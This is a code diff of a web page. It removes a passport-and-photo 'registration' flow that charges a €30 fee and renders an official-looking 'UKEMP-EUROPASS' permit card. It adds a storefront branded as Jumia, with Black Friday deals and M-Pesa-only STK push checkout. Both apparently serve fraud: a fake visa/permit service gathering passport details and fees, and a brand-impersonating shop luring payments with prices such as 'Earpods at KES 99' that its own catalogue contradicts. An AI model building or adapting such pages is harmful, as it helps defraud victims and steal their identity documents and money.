+            P("audio", "Black Friday Deal", true, "Wireless Over-Ear Bluetooth Headphones Foldable Bass", 1650, 3200, 4.7, 428, ["Standard"], "photo-1505740420928-5e560c06d30e"),
+            P("audio", "Party Speaker", true, "Portable Bluetooth Boombox Speaker 10W TF/USB/FM Radio", 1450, 2900, 4.5, 366, ["Standard"], "photo-1608043152269-423dbba4e7e1"),
+            P("audio", "Best Seller", true, "Kids' Cute Cat-Ear LED Wireless Headphones Volume Limit", 990, 2100, 4.6, 214, ["Standard"], "photo-1583394838336-acd977736f90"),
+            P("audio", "Black Friday Deal", true, "TWS G9S Ear-Hook Earbuds Sports Waterproof Secure Fit", 610, 1299, 4.4, 745, ["Standard"], "photo-1631867675167-90a456a90863"),
+            P("audio", "Official Store", true, "Vortex Buds T13 ANC Noise-Cancelling Earbuds 4 Mics", 1299, 2600, 4.7, 501, ["Standard"], "photo-1572569511254-d8f925fe2cbb"),
+            P("audio", "Under 500", true, "Wired In-Ear Earphones HD Bass 3.5mm Jack with Mic", 180, 450, 4.2, 2140, ["Standard"], "photo-1590658268037-6bf12165a8df"),
+            P("audio", "Hot Deal", true, "Bluetooth Speaker Mini RGB Portable Outdoor Showerproof", 720, 1500, 4.5, 830, ["Standard"], "photo-1608043152269-423dbba4e7e1"),
+            P("audio", "Black Friday Deal", true, "Air Pro 4 Pods Wireless Charging Case Pop-Up Window", 460, 1100, 4.4, 1567, ["Standard"], "photo-1606220588913-b3aacb4d2f46"),
+            P("audio", "Gaming Audio", true, "K9 Gaming Headset 7.1 Surround RGB USB for PC & Mobile", 1180, 2300, 4.6, 389, ["Standard"], "photo-1590658268037-6bf12165a8df"),
+            P("audio", "Top Rated", true, "Oraimo FreePods Lite TWS IPX5 Sweatproof 36H Battery", 1150, 2200, 4.7, 952, ["Standard"], "photo-1608156639585-b4a8797ab72c"),
+            P("audio", "Mega Sale", true, "Retractable Car Bluetooth FM Transmitter MP3 Charger", 540, 1050, 4.3, 267, ["Standard"], "photo-1613040809024-b4ef7ba99bcd"),
+
+            // --- WOMEN'S & GIRLS' FASHION ---
+            {
+                id: "fa-girls-romper",
+                dept: "fashion",
+                badge: "Under 500",
+                express: true,
+                name: "Cakepop Girls' Pink Floral Short Sleeve Summer Romper",
+                price: 140,
+                oldPrice: 650,
+                rating: 4.6,
+                reviews: 215,
+                sizes: ["XS", "S", "L"],
+                image: "https://images.unsplash.com/photo-1518831959646-742c3a14ebf7?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "fa-biker-shorts",
+                dept: "fashion",
+                badge: "Multipack",
+                express: true,
+                name: "5pcs Quality Stretchy Teenage Girls Biker Shorts Set",
+                price: 289,
+                oldPrice: 900,
+                rating: 4.5,
+                reviews: 430,
+                sizes: ["XS", "S", "L", "XL"],
+                image: "https://images.unsplash.com/photo-1503342217525-b092457d141e?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "fa-cotton-briefs",
+                dept: "fashion",
+                badge: "6-Pack Deal",
+                express: true,
+                name: "6pcs High Quality Soft Cotton Girls Briefs Multipack",
+                price: 499,
+                oldPrice: 1100,
+                rating: 4.7,
+                reviews: 310,
+                sizes: ["XS", "S", "L"],
+                image: "https://images.unsplash.com/photo-1523381210434-271e8be1f52b?auto=format&fit=crop&w=600&q=80"
             },
-            "Eurozone": {
-                symbol: "€",
-                rate: 1.00,
-                code: "EUR"
+
+            // --- MEN'S FORMAL & LOAFERS ---
+            {
+                id: "mf-monk-strap",
+                dept: "mens-formal",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "JUVNE Men's Double Monk Strap Brogue Dress Shoes",
+                price: 1799,
+                oldPrice: 3200,
+                rating: 4.7,
+                reviews: 284,
+                sizes: ["39", "40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1614252235316-8c857d38b5f4?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "mf-callun-oxford",
+                dept: "mens-formal",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "CALLUN Men's Glossy Business Buckle Dress Shoes",
+                price: 1020,
+                oldPrice: 2100,
+                rating: 4.5,
+                reviews: 410,
+                sizes: ["39", "40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1533867617858-e7b97e060509?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "mf-senegal-loafer",
+                dept: "mens-formal",
+                badge: "Luxury Pick",
+                express: true,
+                name: "Senegal Men's Brown Leather Bit Loafers & Slip-Ons",
+                price: 2733,
+                oldPrice: 4200,
+                rating: 4.8,
+                reviews: 196,
+                sizes: ["40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1573100925118-870b8efc799d?auto=format&fit=crop&w=600&q=80"
             },
-            "South Africa": {
-                symbol: "R",
-                rate: 19.50,
-                code: "ZAR"
+
+            // --- MEN'S SNEAKERS & FOOTBALL CLEATS ---
+            {
+                id: "ms-air-cushion",
+                dept: "mens-sneakers",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "AEMION Men's Air-Cushion Full Black/White Sneakers",
+                price: 1814,
+                oldPrice: 3100,
+                rating: 4.7,
+                reviews: 645,
+                sizes: ["39", "40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1549298916-b41d501d3772?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "ms-football-cleats",
+                dept: "mens-sneakers",
+                badge: "Pro Cleats",
+                express: true,
+                name: "AEMION High-Top Sock Football Boots Firm Ground",
+                price: 1730,
+                oldPrice: 2950,
+                rating: 4.6,
+                reviews: 378,
+                sizes: ["39", "40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1511886929837-354d827aae26?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "ms-puma-resolve",
+                dept: "mens-sneakers",
+                badge: "Official Store",
+                express: true,
+                name: "Puma Running Shoes Resolve Modern - Black/White",
+                price: 12000,
+                oldPrice: 15500,
+                rating: 4.9,
+                reviews: 88,
+                sizes: ["40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1608231387042-66d1773070a5?auto=format&fit=crop&w=600&q=80"
             },
-            "Philippines": {
-                symbol: "₱",
-                rate: 61.50,
-                code: "PHP"
+
+            // --- KIDS' SHOES ---
+            {
+                id: "ks-velcro-white",
+                dept: "kids-shoes",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "Children's Dual-Strap Velcro Sports Sneakers - White",
+                price: 1112,
+                oldPrice: 1950,
+                rating: 4.7,
+                reviews: 230,
+                sizes: ["37", "38"],
+                image: "https://images.unsplash.com/photo-1514989940723-e8e51635b782?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "ks-led-trainers",
+                dept: "kids-shoes",
+                badge: "Kids Favorite",
+                express: true,
+                name: "Arounee Breathable Mesh Kids Light-Up Running Shoes",
+                price: 990,
+                oldPrice: 1800,
+                rating: 4.6,
+                reviews: 189,
+                sizes: ["37", "38"],
+                image: "https://images.unsplash.com/photo-1507464098880-e367bc5d2c08?auto=format&fit=crop&w=600&q=80"
             },
-            "India": {
-                symbol: "₹",
-                rate: 90.00,
-                code: "INR"
-            },
-            "Nigeria": {
-                symbol: "₦",
-                rate: 1650.00,
-                code: "NGN"
-            },
-            "Ghana": {
-                symbol: "GH₵",
-                rate: 16.50,
-                code: "GHS"
-            },
-            "Kenya": {
-                symbol: "KSh",
-                rate: 140.00,
-                code: "KES"
+
+            // --- HOME ORGANIZERS, FITNESS & PHONES ---
+            {
+                id: "hf-shoe-rack-6",
+                dept: "home-fitness",
+                badge: "Home Organizer",
+                express: true,
+                name: "6-Layer Portable Dustproof Shoe Rack Storage Organizer",
+                price: 730,
+                oldPrice: 1600,
+                rating: 4.6,
+                reviews: 1045,
+                sizes: ["Standard"],
+                image: "https://images.unsplash.com/photo-1595428774223-ef52624120d2?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "hf-spin-bike",
+                dept: "home-fitness",
+                badge: "Home Gym",
+                express: false,
+                name: "Chamborino Indoor Fitness Exercise Spin Bike Heavy Flywheel",
+                price: 16499,
+                oldPrice: 24000,
+                rating: 4.8,
+                reviews: 67,
+                sizes: ["Standard"],
+                image: "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "hf-knee-brace",
+                dept: "home-fitness",
+                badge: "2pcs Set",
+                express: true,
+                name: "COOBEGONA 2pcs Compression Knee Brace Support Sleeves",
+                price: 1043,
+                oldPrice: 1800,
+                rating: 4.5,
+                reviews: 152,
+                sizes: ["S", "L", "XL"],
+                image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "hf-redmi-15c",
+                dept: "home-fitness",
+                badge: "Hot Smartphone",
+                express: true,
+                name: "Redmi 15C By Xiaomi, 6.9-Inch Display, 8GB RAM + 256GB ROM",
+                price: 23899,
+                oldPrice: 28500,
+                rating: 4.9,
+                reviews: 318,
+                sizes: ["Standard"],
+                image: "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=600&q=80"
             }
+        ];
+
+        // =========================================================================
+        // 2. APPLICATION STATE & LOCALSTORAGE PERSISTENCE
+        // =========================================================================
+        let state = {
+            selectedDept: "all",
+            selectedSize: null,
+            searchQuery: "",
+            wishlistOnly: false,
+            wishlist: JSON.parse(localStorage.getItem("jumia_bf_wishlist") || "[]"),
+            cart: JSON.parse(localStorage.getItem("jumia_bf_cart") || "[]"),
+            customImages: JSON.parse(localStorage.getItem("jumia_bf_custom_images") || "{}"),
+            deliveryInfo: JSON.parse(localStorage.getItem("jumia_bf_delivery") || "null") || {
+                fullName: "",
+                phone: "",
+                email: "",
+                address: "",
+                city: "",
+                region: "nairobi",
+                notes: ""
+            },
+            pendingProduct: null,
+            pendingSize: null
         };
 
-        document.getElementById('hiddenFileInput').addEventListener('change', function() {
-            if (this.files && this.files.length > 0) {
-                document.getElementById('uploadFeedback').textContent = "Photo Loaded: " + this.files[0].name;
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    uploadedPhotoDataURL = e.target.result;
-                };
-                reader.readAsDataURL(this.files[0]);
+        function escapeHtml(str) {
+            return String(str)
+                .replace(/&/g, "&amp;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#39;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;");
+        }
+
+        function getImageUrl(key, fallback) {
+            return state.customImages[key] && state.customImages[key].trim() !== "" ?
+                state.customImages[key].trim() :
+                fallback;
+        }
+
+        function handleImgFallback(imgEl) {
+            if (imgEl.src !== FALLBACK_IMAGE) {
+                imgEl.src = FALLBACK_IMAGE;
             }
-        });
+        }
 
-        document.getElementById('receiptFileInput').addEventListener('change', function() {
-            if (this.files && this.files.length > 0) {
-                document.getElementById('receiptUploadFeedback').textContent = "Receipt Attached: " + this.files[0].name;
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    uploadedReceiptDataURL = e.target.result;
-                };
-                reader.readAsDataURL(this.files[0]);
+        // =========================================================================
+        // 3. RENDER BANNERS & ORGANIZED CATEGORY SECTIONS
+        // =========================================================================
+        function applyBannerImages() {
+            document.getElementById("heroImgEarpods").src = getImageUrl("heroEarpods", DEFAULT_BANNER_IMAGES.heroEarpods);
+            document.getElementById("heroImgShoes").src = getImageUrl("heroShoes", DEFAULT_BANNER_IMAGES.heroShoes);
+            document.getElementById("heroImgJumpsuit").src = getImageUrl("heroJumpsuit", DEFAULT_BANNER_IMAGES.heroJumpsuit);
+            document.getElementById("catImgClothes").src = getImageUrl("catClothes", DEFAULT_BANNER_IMAGES.catClothes);
+            document.getElementById("catImgShoes").src = getImageUrl("catShoes", DEFAULT_BANNER_IMAGES.catShoes);
+            document.getElementById("catImgAccessories").src = getImageUrl("catAccessories", DEFAULT_BANNER_IMAGES.catAccessories);
+        }
+
+        function getFilteredProducts() {
+            return PRODUCTS.filter(p => {
+                if (state.wishlistOnly && !state.wishlist.includes(p.id)) return false;
+                if (state.selectedSize && !p.sizes.includes(state.selectedSize)) return false;
+                if (state.selectedDept === "flash-poster" && !POSTER_DEAL_IDS.includes(p.id)) return false;
+                if (state.searchQuery.trim() !== "") {
+                    const q = state.searchQuery.toLowerCase();
+                    const matchName = p.name.toLowerCase().includes(q);
+                    const matchDept = p.dept.toLowerCase().includes(q);
+                    if (!matchName && !matchDept) return false;
+                }
+                return true;
+            });
+        }
+
+        function renderCatalog() {
+            const container = document.getElementById("catalogContainer");
+            const filtered = getFilteredProducts();
+            container.innerHTML = "";
+
+            const banner = document.getElementById("activeFilterBanner");
+            const filterText = document.getElementById("activeFilterText");
+            const filtersActive = state.selectedSize || state.searchQuery.trim() !== "" || state.wishlistOnly || state.selectedDept !== "all";
+
+            if (filtersActive) {
+                banner.classList.remove("hidden");
+                const parts = [];
+                if (state.selectedDept !== "all") parts.push(`Category: ${state.selectedDept}`);
+                if (state.selectedSize) parts.push(`Size: ${state.selectedSize}`);
+                if (state.wishlistOnly) parts.push("Saved Wishlist");
+                if (state.searchQuery.trim()) parts.push(`Search: "${state.searchQuery}"`);
+                filterText.textContent = `${filtered.length} item(s) • ${parts.join(" | ")}`;
+            } else {
+                banner.classList.add("hidden");
             }
-        });
 
-        function navigateStep2() {
-            const first = document.getElementById('inputFirstName').value.trim();
-            const last = document.getElementById('inputLastName').value.trim();
-            const passport = document.getElementById('inputPassport').value.trim();
-            const dob = document.getElementById('inputDOB').value;
-            const resInput = document.getElementById('inputResidence').value;
+            const visibleDepts = state.selectedDept === "all" || state.selectedDept === "flash-poster" ?
+                DEPARTMENTS :
+                DEPARTMENTS.filter(d => d.id === state.selectedDept);
 
-            if (!first || !last || !passport || !dob || !resInput) {
-                alert('Please complete all registration fields.');
+            let totalRendered = 0;
+
+            visibleDepts.forEach(dept => {
+                let items = filtered.filter(p => p.dept === dept.id);
+                if (state.selectedDept === "flash-poster") {
+                    items = items.filter(p => POSTER_DEAL_IDS.includes(p.id));
+                }
+                if (items.length === 0) return;
+                totalRendered += items.length;
+
+                const section = document.createElement("section");
+                section.id = `sec-${dept.id}`;
+                section.className = "bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden";
+
+                section.innerHTML = `
+          <div class="bg-gradient-to-r from-[#111111] via-[#1f1f23] to-[#27272a] text-white px-5 py-4 flex flex-wrap items-center justify-between gap-2 border-b-2 border-[#f68b1e]">
+            <div>
+              <h2 class="font-montserrat font-black text-lg sm:text-xl tracking-tight">${dept.title}</h2>
+              <p class="text-xs text-gray-300">${dept.subtitle}</p>
+            </div>
+            <span class="bg-[#ffd200] text-black font-extrabold text-xs px-3 py-1 rounded-full">${items.length} Deals</span>
+          </div>
+          <div class="p-4 sm:p-5 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3.5 sm:gap-4">
+            ${items.map(p => renderProductCard(p)).join("")}
+          </div>
+        `;
+                container.appendChild(section);
+            });
+
+            if (totalRendered === 0) {
+                container.innerHTML = `
+          <div class="bg-white rounded-2xl p-12 text-center border border-gray-200 space-y-3">
+            <p class="text-3xl">🔍</p>
+            <h3 class="font-bold text-lg text-gray-900">No matching products found</h3>
+            <p class="text-xs text-gray-500">Try clearing your size or search filter to see all Black Friday deals.</p>
+            <button onclick="resetAllFilters()" class="bg-[#f68b1e] text-white font-bold text-xs px-5 py-2.5 rounded-lg uppercase">Show All Products</button>
+          </div>
+        `;
+            }
+        }
+
+        function renderProductCard(product) {
+            const discount = Math.round(((product.oldPrice - product.price) / product.oldPrice) * 100);
+            const isSaved = state.wishlist.includes(product.id);
+            const imgSrc = getImageUrl(product.id, product.image);
+
+            const sizeChipsHtml = product.sizes.length > 1 ?
+                product.sizes.map(sz => `
+            <button onclick="event.stopPropagation(); pickSizeDirect('${product.id}', '${sz}')" title="Select size ${sz} & add to cart"
+              class="size-chip text-[10px] bg-gray-100 text-gray-700 font-bold px-1.5 py-0.5 rounded border border-transparent hover:border-[#111111]">
+              ${sz}
+            </button>
+          `).join("") :
+                `<span class="text-[10px] bg-gray-100 text-gray-700 font-bold px-1.5 py-0.5 rounded">${product.sizes[0]}</span>`;
+
+            return `
+        <article class="group bg-white rounded-xl border border-gray-200 hover:border-[#f68b1e] hover:shadow-lg transition flex flex-col justify-between overflow-hidden relative">
+          <div class="relative aspect-square bg-gray-50 overflow-hidden">
+            <img src="${imgSrc}" alt="${escapeHtml(product.name)}" loading="lazy" onerror="handleImgFallback(this)" class="w-full h-full object-cover group-hover:scale-105 transition duration-300" />
+            <span class="absolute top-2 left-2 bg-[#111111] text-[#ffd200] text-[10px] font-black px-2 py-0.5 rounded uppercase">
+              ${product.badge}
+            </span>
+            <span class="absolute bottom-2 left-2 bg-orange-100 text-[#e64a00] text-[11px] font-extrabold px-1.5 py-0.5 rounded">
+              -${discount}%
+            </span>
+            <button onclick="toggleWishlist('${product.id}')" class="absolute top-2 right-2 w-8 h-8 rounded-full bg-white/90 hover:bg-white shadow flex items-center justify-center transition" title="Save to Wishlist">
+              <svg class="w-4 h-4 ${isSaved ? 'fill-[#e01b24] text-[#e01b24]' : 'text-gray-500'}" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
+              </svg>
+            </button>
+          </div>
+
+          <div class="p-3 flex-1 flex flex-col justify-between space-y-2.5">
+            <div>
+              <h3 class="text-xs sm:text-sm font-semibold text-gray-800 line-clamp-2 leading-snug group-hover:text-[#f68b1e] transition">
+                ${escapeHtml(product.name)}
+              </h3>
+              <div class="mt-1.5 flex items-baseline gap-2">
+                <span class="font-montserrat font-black text-base sm:text-lg text-gray-900">KSh ${product.price.toLocaleString()}</span>
+                <span class="text-xs text-gray-400 line-through">KSh ${product.oldPrice.toLocaleString()}</span>
+              </div>
+              <div class="flex items-center gap-1.5 mt-1 text-[11px] text-gray-500">
+                <span class="text-amber-500 font-bold">★ ${product.rating}</span>
+                <span>(${product.reviews})</span>
+                ${product.express ? '<span class="ml-auto text-[10px] font-black italic text-[#f68b1e]">JUMIA EXPRESS</span>' : ''}
+              </div>
+              <div class="mt-1.5 flex flex-wrap items-center gap-1">
+                <span class="text-[10px] font-black text-gray-500 uppercase">Size:</span>
+                ${sizeChipsHtml}
+              </div>
+            </div>
+
+            <button onclick="initiateAddToCart('${product.id}')" class="w-full bg-[#f68b1e] hover:bg-[#e07b12] text-white font-extrabold text-xs py-2.5 rounded-lg uppercase tracking-wide shadow-sm transition">
+              Add To Cart
+            </button>
+          </div>
+        </article>
+      `;
+        }
+
+        // =========================================================================
+        // 4. FILTERING & NAVIGATION CONTROLS
+        // =========================================================================
+        function selectDepartment(deptId) {
+            state.selectedDept = deptId;
+            document.querySelectorAll(".dept-tab").forEach(btn => {
+                if (btn.dataset.dept === deptId) {
+                    btn.className = "dept-tab px-3.5 py-1.5 rounded-full bg-[#111111] text-[#ffd200] whitespace-nowrap transition";
+                } else {
+                    btn.className = "dept-tab px-3.5 py-1.5 rounded-full bg-white text-gray-800 border border-gray-200 hover:border-[#f68b1e] whitespace-nowrap transition";
+                }
+            });
+
+            if (deptId === "flash-poster") {
+                document.getElementById("sec-flash-poster").scrollIntoView({
+                    behavior: "smooth"
+                });
+                renderCatalog();
                 return;
             }
 
-            currentPassport = passport;
+            renderCatalog();
 
-            document.getElementById('view-step-1').classList.remove('active');
-            document.getElementById('view-step-2').classList.add('active');
-            document.getElementById('node-1').classList.add('completed');
-            document.getElementById('node-2').classList.add('active');
+            if (deptId !== "all") {
+                const target = document.getElementById(`sec-${deptId}`);
+                if (target) target.scrollIntoView({
+                    behavior: "smooth"
+                });
+            }
+        }
 
-            const feeStr = "€30.00 EUR";
-            document.getElementById("fee-total-gbp").textContent = feeStr;
-            document.getElementById("fee-total-display").textContent = feeStr;
+        function toggleSizeFilter(size) {
+            state.selectedSize = state.selectedSize === size ? null : size;
+            document.querySelectorAll(".star-badge").forEach(btn => {
+                btn.classList.toggle("active", btn.dataset.size === state.selectedSize);
+            });
+            document.getElementById("resetSizeBtn").classList.toggle("hidden", !state.selectedSize);
+            renderCatalog();
+        }
 
-            const currInfo = currencyRates[resInput] || {
-                symbol: "€",
-                rate: 1.00,
-                code: "EUR"
+        function clearSizeFilter() {
+            state.selectedSize = null;
+            document.querySelectorAll(".star-badge").forEach(btn => btn.classList.remove("active"));
+            document.getElementById("resetSizeBtn").classList.add("hidden");
+            renderCatalog();
+        }
+
+        function applyFilters() {
+            const input = document.getElementById("searchInput");
+            state.searchQuery = input.value;
+            document.getElementById("clearSearchBtn").classList.toggle("hidden", !state.searchQuery);
+            renderCatalog();
+        }
+
+        function clearSearch() {
+            document.getElementById("searchInput").value = "";
+            state.searchQuery = "";
+            document.getElementById("clearSearchBtn").classList.add("hidden");
+            renderCatalog();
+        }
+
+        function toggleWishlist(productId) {
+            if (state.wishlist.includes(productId)) {
+                state.wishlist = state.wishlist.filter(id => id !== productId);
+                showToast("Removed from saved items");
+            } else {
+                state.wishlist.push(productId);
+                showToast("Saved to your wishlist ❤️");
+            }
+            localStorage.setItem("jumia_bf_wishlist", JSON.stringify(state.wishlist));
+            updateCounters();
+            renderCatalog();
+        }
+
+        function toggleWishlistFilter() {
+            state.wishlistOnly = !state.wishlistOnly;
+            document.getElementById("wishlistNavBtn").classList.toggle("bg-red-50", state.wishlistOnly);
+            renderCatalog();
+            showToast(state.wishlistOnly ? "Showing saved items only" : "Showing all products");
+        }
+
+        function resetAllFilters() {
+            state.selectedDept = "all";
+            state.selectedSize = null;
+            state.searchQuery = "";
+            state.wishlistOnly = false;
+            document.getElementById("searchInput").value = "";
+            document.getElementById("clearSearchBtn").classList.add("hidden");
+            document.getElementById("resetSizeBtn").classList.add("hidden");
+            document.getElementById("wishlistNavBtn").classList.remove("bg-red-50");
+            document.querySelectorAll(".star-badge").forEach(btn => btn.classList.remove("active"));
+            selectDepartment("all");
+        }
+
+        // =========================================================================
+        // 5. CART, SIZE SELECTION & PAYHERO STK PUSH CHECKOUT (M-PESA ONLY)
+        // =========================================================================
+        function quickAddById(productId) {
+            const p = PRODUCTS.find(item => item.id === productId);
+            if (!p) return;
+            if (p.sizes.length > 1) {
+                openSizeModal(p);
+            } else {
+                addToCart(p, p.sizes[0]);
+            }
+        }
+
+        function initiateAddToCart(productId) {
+            const p = PRODUCTS.find(item => item.id === productId);
+            if (!p) return;
+            if (p.sizes.length > 1) {
+                openSizeModal(p);
+            } else {
+                addToCart(p, p.sizes[0]);
+            }
+        }
+
+        function pickSizeDirect(productId, size) {
+            const p = PRODUCTS.find(item => item.id === productId);
+            if (!p) return;
+            openSizeModal(p);
+            state.pendingSize = size;
+            renderSizeModalOptions();
+        }
+
+        function openSizeModal(product) {
+            state.pendingProduct = product;
+            state.pendingSize = state.selectedSize && product.sizes.includes(state.selectedSize) ?
+                state.selectedSize :
+                product.sizes[0];
+
+            document.getElementById("sizeModalTitle").textContent = product.name;
+            document.getElementById("sizeModalPrice").textContent = `KSh ${product.price.toLocaleString()}`;
+            renderSizeModalOptions();
+            document.getElementById("sizeModal").classList.remove("hidden");
+        }
+
+        function renderSizeModalOptions() {
+            const container = document.getElementById("sizeModalOptions");
+            container.innerHTML = state.pendingProduct.sizes.map(sz => {
+                const active = sz === state.pendingSize;
+                return `
+          <button onclick="selectPendingSize('${sz}')" class="px-4 py-2 rounded-xl font-bold text-sm border-2 transition ${active ? 'border-[#f68b1e] bg-orange-50 text-[#f68b1e]' : 'border-gray-200 text-gray-800 hover:border-gray-400'}">
+            ${sz}
+          </button>
+        `;
+            }).join("");
+        }
+
+        function selectPendingSize(sz) {
+            state.pendingSize = sz;
+            renderSizeModalOptions();
+        }
+
+        function confirmSizeAdd() {
+            if (state.pendingProduct && state.pendingSize) {
+                addToCart(state.pendingProduct, state.pendingSize);
+                closeSizeModal();
+            }
+        }
+
+        function closeSizeModal() {
+            document.getElementById("sizeModal").classList.add("hidden");
+            state.pendingProduct = null;
+            state.pendingSize = null;
+        }
+
+        function addToCart(product, size) {
+            const existing = state.cart.find(item => item.id === product.id && item.size === size);
+            if (existing) {
+                existing.qty += 1;
+            } else {
+                state.cart.push({
+                    id: product.id,
+                    name: product.name,
+                    price: product.price,
+                    image: product.image,
+                    size: size,
+                    qty: 1
+                });
+            }
+            saveCart();
+            showToast(`Added "${product.name.slice(0, 26)}..." (${size})`);
+        }
+
+        function updateCartQty(index, delta) {
+            state.cart[index].qty += delta;
+            if (state.cart[index].qty <= 0) {
+                state.cart.splice(index, 1);
+            }
+            saveCart();
+            renderCartDrawer();
+        }
+
+        function saveCart() {
+            localStorage.setItem("jumia_bf_cart", JSON.stringify(state.cart));
+            updateCounters();
+        }
+
+        function updateCounters() {
+            const totalItems = state.cart.reduce((sum, item) => sum + item.qty, 0);
+            document.getElementById("cartBadge").textContent = totalItems;
+            document.getElementById("drawerCartCount").textContent = totalItems;
+            document.getElementById("wishlistCount").textContent = state.wishlist.length;
+        }
+
+        function openCart() {
+            renderCartDrawer();
+            document.getElementById("cartDrawer").classList.remove("hidden");
+        }
+
+        function closeCart() {
+            document.getElementById("cartDrawer").classList.add("hidden");
+        }
+
+        function getCartTotals() {
+            const subtotal = state.cart.reduce((sum, i) => sum + i.price * i.qty, 0);
+            const freeThreshold = 1999;
+            const shipping = subtotal === 0 || subtotal >= freeThreshold ? 0 : 150;
+            return {
+                subtotal,
+                shipping,
+                total: subtotal + shipping
             };
-            const localAmount = (30.00 * currInfo.rate).toFixed(2);
-            document.getElementById("fx-amount").textContent = `${feeStr} (${currInfo.symbol}${localAmount} ${currInfo.code})`;
         }
 
-        function navigateBack1() {
-            document.getElementById('view-step-2').classList.remove('active');
-            document.getElementById('view-step-1').classList.add('active');
-            document.getElementById('node-1').classList.remove('completed');
-            document.getElementById('node-2').classList.remove('active');
-        }
+        function renderCartDrawer() {
+            const list = document.getElementById("cartItemsList");
+            if (state.cart.length === 0) {
+                list.innerHTML = `
+          <div class="text-center py-12 space-y-3">
+            <p class="text-4xl">🛒</p>
+            <p class="font-bold text-gray-800">Your Black Friday cart is empty</p>
+            <p class="text-xs text-gray-500">Grab Earpods at KES 99 or Ladies' Shoes & Jumpsuits at KES 200!</p>
+          </div>
+        `;
+                document.getElementById("deliveryInfoSection").classList.add("hidden");
+                document.getElementById("paymentSection").classList.add("hidden");
+            } else {
+                document.getElementById("deliveryInfoSection").classList.remove("hidden");
+                document.getElementById("paymentSection").classList.remove("hidden");
 
-        function formatDocumentDate(dateObject) {
-            const months = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"];
-            return dateObject.getDate() + " " + months[dateObject.getMonth()] + " " + dateObject.getFullYear();
-        }
-
-        function processVerificationPreview() {
-            const firstName = document.getElementById('inputFirstName').value.trim();
-            const lastName = document.getElementById('inputLastName').value.trim();
-            const passport = document.getElementById('inputPassport').value.trim();
-            const dobString = document.getElementById('inputDOB').value;
-            const nationality = document.getElementById('inputResidence').value;
-
-            const activeCurrentDate = new Date();
-            const futureExpiryDate = new Date();
-            futureExpiryDate.setFullYear(activeCurrentDate.getFullYear() + 2);
-            const parsedDobObj = new Date(dobString);
-
-            document.getElementById('clientGreetName').textContent = firstName + " " + lastName;
-
-            propagateSyncTextText('cardOutName', lastName + ", " + firstName);
-            propagateSyncTextText('cardOutDOB', formatDocumentDate(parsedDobObj));
-            propagateSyncTextText('cardOutNation', nationality);
-            propagateSyncTextText('cardOutPassport', passport);
-            propagateSyncTextText('cardOutIssued', formatDocumentDate(activeCurrentDate));
-            propagateSyncTextText('cardOutExpiry', formatDocumentDate(futureExpiryDate));
-            propagateSyncTextText('cardOutRef', "UKEMP-EUROPASS-7X3-" + passport.substring(0, Math.min(4, passport.length)).toUpperCase());
-
-            const biometricMountFrames = document.getElementsByClassName('avatarDisplayBox');
-            for (let singleFrame of biometricMountFrames) {
-                if (uploadedPhotoDataURL) {
-                    singleFrame.innerHTML = '<img src="' + uploadedPhotoDataURL + '" alt="Portrait Asset">';
-                } else {
-                    singleFrame.innerHTML = '<div style="font-size:0.55rem; color:#a0aec0; text-align:center; font-weight:700;">BIOMETRIC PORTRAIT</div>';
-                }
+                list.innerHTML = state.cart.map((item, idx) => `
+          <div class="flex items-center gap-3 bg-white p-3 rounded-xl border border-gray-200">
+            <img src="${getImageUrl(item.id, item.image)}" alt="${escapeHtml(item.name)}" onerror="handleImgFallback(this)" class="w-16 h-16 rounded-lg object-cover bg-gray-100 shrink-0" />
+            <div class="flex-1 min-w-0">
+              <h4 class="text-xs font-bold text-gray-900 truncate">${escapeHtml(item.name)}</h4>
+              <span class="inline-block text-[10px] bg-gray-100 text-gray-700 font-bold px-1.5 py-0.5 rounded mt-0.5">Size: ${item.size}</span>
+              <p class="font-montserrat font-black text-sm text-[#e01b24] mt-1">KSh ${(item.price * item.qty).toLocaleString()}</p>
+            </div>
+            <div class="flex items-center gap-1.5">
+              <button onclick="updateCartQty(${idx}, -1)" class="w-7 h-7 rounded-lg bg-gray-100 hover:bg-gray-200 font-black text-sm">−</button>
+              <span class="w-5 text-center text-xs font-extrabold">${item.qty}</span>
+              <button onclick="updateCartQty(${idx}, 1)" class="w-7 h-7 rounded-lg bg-[#f68b1e] text-white font-black text-sm">+</button>
+            </div>
+          </div>
+        `).join("");
             }
 
-            document.getElementById('view-step-2').classList.remove('active');
-            document.getElementById('view-step-3').classList.add('active');
-            document.getElementById('node-2').classList.add('completed');
-            document.getElementById('node-3').classList.add('active');
+            const {
+                subtotal,
+                shipping,
+                total
+            } = getCartTotals();
 
